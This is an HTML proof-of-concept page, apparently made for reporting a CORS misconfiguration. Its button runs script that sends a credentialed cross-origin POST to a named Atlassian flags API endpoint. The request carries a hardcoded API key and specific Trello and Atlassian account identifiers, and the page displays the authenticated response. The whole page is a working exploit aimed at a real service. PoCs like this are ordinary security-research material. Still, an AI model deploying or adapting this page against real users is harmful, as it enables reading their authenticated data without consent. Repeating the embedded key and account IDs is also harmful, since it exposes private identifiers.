<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORS Exploit PoC</title>
</head>
<body>
    <h1>CORS Misconfiguration Exploit</h1>
    <button id="exploitBtn">Exploit</button>
    <script>
        document.getElementById('exploitBtn').addEventListener('click', function() {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://api.atlassian.com/flags/api/v2/frontend/experimentValues", true);
            xhr.withCredentials = true; // This is crucial for including user credentials in the request
            
            // Set the content type for JSON
            xhr.setRequestHeader("Content-Type", "application/json");
            // Include the X-Api-Key header
            xhr.setRequestHeader("X-Api-Key", "1f24403e-f053-43de-b063-e20b357a8f63");

            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) { // Check for completion of the request
                    if(xhr.status === 200) {
                        alert("Exploited: " + xhr.responseText); // Displaying the response for demonstration
                    } else {
                        alert("Error: " + xhr.status); // Displaying the error status for troubleshooting
                    }
                }
            };

            // JSON data to be sent in the request
            var data = {
                "identifiers": {
                    "trelloUserId": "65e16557892f52f8e5150fc0",
                    "atlassianAccountId": "712020:4428e394-e3d7-4336-ac56-01d2acca1d17",
                    "analyticsAnonymousId": "ae147106-c93b-08bc-2628-00c89b4b4638"
                },
                "customAttributes": {
                    "locale": "en-US",
                    "version": "build-197942"
                },
                "targetApp": "trello_web"
            };

            xhr.send(JSON.stringify(data)); // Sending the JSON data
        });
    </script>
</body>
</html>